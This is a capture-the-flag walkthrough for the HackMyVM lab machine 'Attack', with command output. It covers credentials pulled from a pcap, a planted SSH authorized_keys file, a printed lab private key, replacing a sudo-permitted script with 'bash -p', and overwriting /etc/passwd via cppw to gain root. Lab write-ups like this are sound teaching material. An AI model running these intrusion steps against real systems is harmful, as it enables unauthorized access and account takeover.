@@ -1,0 +1,279 @@
+---
+title: "Attack - HackMyVM Walkthrough"
+---
+nmap service scan:
+┌──(kali㉿kali)-[~]
+└─$ nmap -p- -sV 192.168.56.254 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-11 13:26 EST
+Nmap scan report for may.hmv (192.168.56.254)
+Host is up (0.00044s latency).
+Not shown: 65012 closed ports, 520 filtered ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp open  http    nginx 1.14.2
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Anonymous login via FTP requires a password. Moving on to the webserver
+Message from the developer:
+I did a capture with wireshark. The name of the file is "capture" but i dont remember the extension :(
+
+using gobuster to enumerate directories and files with specific extensions:
+┌──(kali㉿kali)-[~/ctf]
+└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -q -x html,pcap -u http://192.168.56.254/  
+/index.html           (Status: 200) [Size: 104]
+/capture.pcap         (Status: 200) [Size: 406500]
+
+I took a look at the pcap file with wireshark and discovered the FTP user "teste" and
+the password "simple". Logging in as teste:
+┌──(kali㉿kali)-[~/ctf/attack]
+└─$ ftp 192.168.56.254
+Connected to 192.168.56.254.
+220 ProFTPD Server (Debian) [::ffff:192.168.56.254]
+Name (192.168.56.254:kali): teste
+331 Password required for teste
+Password:
+230 User teste logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -asl
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   4 teste    teste        4096 Jan  7  2021 .
+drwxr-xr-x   5 root     root         4096 Jan  7  2021 ..
+-rw-r--r--   1 teste    teste         220 Jan  7  2021 .bash_logout
+-rw-r--r--   1 teste    teste        3526 Jan  7  2021 .bashrc
+drwxr-xr-x   3 teste    teste        4096 Jan  7  2021 .local
+-rw-r--r--   1 teste    teste      360917 Jan  7  2021 mysecret.png
+-rw-r--r--   1 teste    teste          25 Jan  7  2021 note.txt
+-rw-r--r--   1 teste    teste         807 Jan  7  2021 .profile
+drwx------   2 teste    teste        4096 Jan  7  2021 .ssh
+-rw-------   1 teste    teste          52 Jan  7  2021 .Xauthority
+
+I downloaded the mysecret.png and note.txt files and uploaded an authorized_keys with
+my public key in it to the .ssh directory. 
+
+I ran zsteg on the png and found nothing. notes.txt:
+I need to find the file!
+
+Not sure what that means just yet, maybe it's something to do with the pcap file. 
+
+Logging in over SSH:
+┌──(kali㉿kali)-[~/ctf/attack]
+└─$ ssh teste@192.168.56.254                                       
+The authenticity of host '192.168.56.254 (192.168.56.254)' can't be established.
+ECDSA key fingerprint is SHA256:1cK568mbPXanPvvb13QXyrZSFGIrMn0uPpCA4+kM0FM.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.56.254' (ECDSA) to the list of known hosts.
+Linux attack 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Jan  7 16:19:46 2021 from 192.168.1.58
+teste@attack:~$ 
+
+There's an interesting file name I found in the pcap file, `filexxx.zip` was being 
+requested using HTTP. I unzipped the archive which contained an `id_rsa` private key.
+
+Maybe it's for one of the other users. users:
+teste@attack:~$ grep bash /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+teste:x:1000:1000:teste,,,:/home/teste:/bin/bash
+jackob:x:1001:1001:,,,:/home/jackob:/bin/bash
+kratos:x:1002:1002:,,,:/home/kratos:/bin/bash
+
+I tried each one without success. It probably belongs to teste. 
+
+### Local Enumeration & Privilege Escalation
+
+I checked the jackob directory for anything interesting and found the following files
+teste@attack:/home/jackob$ cat note.txt 
+I need to launch the script to start the attack planned by kratos.
+
+teste@attack:/home/jackob$ cat attack.sh 
+#!/bin/bash
+echo "[+] LAUNCHING ATTACK"
+the9command="/usr/bin/id"
+the2command="/usr/bin/ls"
+the4command="/usr/bin/echo"
+the3command="/usr/bin/uptime"
+theOcommand="/usr/bin/echo"
+the1command="/usr/bin/id"
+the6Command="/usr/bin/echo"
+the7command="/usr/bin/w"
+the8command="/usr/bin/echo"
+the5command="/usr/bin/id"
+
+echo "[+] NEXT PHASE"
+the10command="/usr/bin/id"
+the20command="/usr/bin/echo"
+the30command="/usr/bin/echo"
+the40command="/usr/bin/w"
+the50command="/usr/bin/echo"
+the60command="/usr/bin/date"
+the70command="/usr/bin/uptime"
+the85command="/usr/bin/echo"
+
+echo "[+] FINAL PHASE"
+$the1command >> /tmp/a
+$the2command >> /tmp/a
+$the3command >> /tmp/b
+$the4command >> /tmp/b
+$the5command >> /tmp/c
+$the6command >> /tmp/c
+$the7command >> /tmp/d
+$the8command >> /tmp/d
+$the9command >> /tmp/f
+$the0command >> /tmp/f
+$the10command >> /tmp/g
+$the20command >> /tmp/g
+$the30command >> /tmp/h
+$the40command >> /tmp/h
+$the50command >> /tmp/r
+$the60command > /tmp/r
+$the70command > /tmp/w
+$the85command > /tmp/z
+
+Moving back to the pcap file moving right on the end is another version of 
+filexxx.zip being requested. We can export the file from wireshark as an HTTP object.
+
+Downloading and unzipping the file I got mycode.png, this barcode was then fed to
+https://www.onlinebarcodereader.com/
+
+We're then given the following: http://localhost/jackobattack.txt
+
+jackobattack.txt:
+Hey jackob, you will need this:
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAt1O2ZANL3BPkL32RqWk3ONGDYkw58GyD2rqK0RDRblATgo+9+Vpy
+wpavGbvNGF1aph9Mf+Tmn6b95yQ6GiAaDUrtiRJXLR1/27Facslk8grW+/uBFVou4vBLB6
+exY/+mbsBZxy54RiKp2WVZ3oKOgQ3ybEWX9BVGp0dRdp16GJmyDVcAMR+g4dc/J0Ee59X8
+hKlV6MCmGkTZ1/Bn/CCzwztt3HqTVCK/86cQdzGGYeNDSUKUYYE51Ym00PLb8yhJBelJhR
+udo+59dLLdGcyQMiCDbBnO7b/RbhRHUnjuuZHaVmkAGs4FBwahDza1QYMp1Fs1sjbDh0I+
+trm4Vci2qQAAA8gBP1jWAT9Y1gAAAAdzc2gtcnNhAAABAQC3U7ZkA0vcE+QvfZGpaTc40Y
+NiTDnwbIPauorRENFuUBOCj735WnLClq8Zu80YXVqmH0x/5Oafpv3nJDoaIBoNSu2JElct
+HX/bsVpyyWTyCtb7+4EVWi7i8EsHp7Fj/6ZuwFnHLnhGIqnZZVnego6BDfJsRZf0FUanR1
+F2nXoYmbINVwAxH6Dh1z8nQR7n1fyEqVXowKYaRNnX8Gf8ILPDO23cepNUIr/zpxB3MYZh
+40NJQpRhgTnVibTQ8tvzKEkF6UmFG52j7n10st0ZzJAyIINsGc7tv9FuFEdSeO65kdpWaQ
+AazgUHBqEPNrVBgynUWzWyNsOHQj62ubhVyLapAAAAAwEAAQAAAQB79EYmaXQpYemvkp+i
+hFmqOT80f4XNYhHlGqwxn8V7aPlIFhjFOLrPh0Lti2WpS7W3DQKUlxi4ahjS6FPAxmPXCQ
+qC27vF7WQ+DzSw2CtA3MNvrSYiYc/B8edJTcFLc9f8mmIZovn/sgBV1YlmQbBI4j0/p+6O
+QrR69mXGZcPgTSSA73N/eR92Bd5AB4e5PI9Io7Ib/GKUgDtilkGhElJ5EHVq0jVxTWq6lP
+WnYm4NIX8Rt3+cOX01ohTDKetbrULrVYqcSPLHLgUjskghP8XqTYwy02LJQoTggHgAKFqt
+3M5x5C798R2lHGvTZKkLHeTUzHvcjb+uLun+fFCPSuABAAAAgAVc3cUkXUPGpfzeB7A2CZ
+Dq0Vy+auMPGMdQSbYg5GgZhwZzPeGKXWx7a6oVvKvxQ33tGXph6u2Nf9Xz3AIar7vVmoJb
+TbpngEMxLcsM1DUT1rORcat+G5g0SVUQRssA8+xT+rxx0n0qnJSjMrxYsnu1FPw8iwCt6g
+oLAUKk2RqiAAAAgQDzQ9b9CdPD81PXjOEvW+xgT2r16zarfR+3jZjuf7xEHy7PUIE4mV1r
+L3Ap2WRtwEOg+izTfBPJCegDognPWHsqLkgNtPZ4wDwbnfrL//zPNVZkZsknxe6wnZ3gvv
+jG0IttS7fPqk+XZ6rwAjYUBkUBCGZlWb5lhSRHQcL3fU1IgQAAAIEAwOyaSNsmJ88xb5xf
++75biKyPhHVAaJtfXnMYo+rsHGIUZIZKmok1em8VTJgGAUs+yJrYF2TvlNmvlv5jrGSNPQ
+Tf0wbkfaxG8n2FqtjIpCK222bt5kMZ1uULczCjitOVQpNAFt5mJKeqWUjOLj409luMFKY+
+zTtL5/FYdo2LGikAAAANamFja29iQGF0dGFjawECAwQFBg==
+-----END OPENSSH PRIVATE KEY-----
+
+Nice, we have the key for the user jackob. Logging in via SSH: 
+
+┌──(kali㉿kali)-[~/ctf/attack]
+└─$ ssh -i jackob_id_rsa jackob@192.168.56.254
+Linux attack 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+jackob@attack:~$
+
+checking sudo:
+jackob@attack:~$ sudo -l
+Matching Defaults entries for jackob on attack:
+    !env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jackob may run the following commands on attack:
+    (kratos) NOPASSWD: /home/jackob/attack.sh
+
+Running the attack.sh file:
+jackob@attack:~$ sudo -u kratos /home/jackob/attack.sh
+[+] LAUNCHING ATTACK
+[+] NEXT PHASE
+[+] FINAL PHASE
+[+] DONE
+
+
+I didn't have write permissions of attack.sh, so I deleted it and created a new
+script:
+jackob@attack:~$ rm attack.sh 
+rm: remove write-protected regular file 'attack.sh'? y
+jackob@attack:~$ ls -a
+.  ..  .bash_logout  .bashrc  flag.sh  .local  note.txt  .profile  .ssh  user.txt
+jackob@attack:~$ echo "bash -p" >> attack.sh
+jackob@attack:~$ sudo -u kratos /home/jackob/attack.sh
+sudo: /home/jackob/attack.sh: command not found
+jackob@attack:~$ ls -a
+.   attack.sh     .bashrc  .local    .profile  user.txt
+..  .bash_logout  flag.sh  note.txt  .ssh
+jackob@attack:~$ chmod +x attack.sh 
+jackob@attack:~$ sudo -u kratos /home/jackob/attack.sh
+kratos@attack:~$ 
+
+Checking sudo command privileges for the user kratos:
+kratos@attack:~$ sudo -l
+Matching Defaults entries for kratos on attack:
+    !env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User kratos may run the following commands on attack:
+    (root) NOPASSWD: /usr/sbin/cppw
+
+cppw overwrites the passwd or the shadow file with a file we can specify. This is a
+very dangerous command as you can break the authentication for every user on the 
+system. I copied out the content of passwd and saved it to newpasswd. 
+
+Editing the values in passwd file to use a password I generated with openssl. 
+newpasswd:
+root:$6$xyz$/pdZy4hazXmqu1t0TACitLlKZPD4bFyRUw6ycXiOTdf4kcnkmpgmtg9zUpEE8rG9KtOWwX7kp1Gl96NCGbDk60:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+teste:x:1000:1000:teste,,,:/home/teste:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
+ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
+jackob:x:1001:1001:,,,:/home/jackob:/bin/bash
+kratos:x:1002:1002:,,,:/home/kratos:/bin/bash
+
+I edited the password field for the root user. we can then use the cppw to overwrite
+the '/etc/passwd` file with ours:
+kratos@attack:/home/kratos$ sudo /usr/sbin/cppw newpasswd 
+kratos@attack:/home/kratos$ su root
+root@attack:/home/kratos#
+
+Got the root flag and submitted it. 
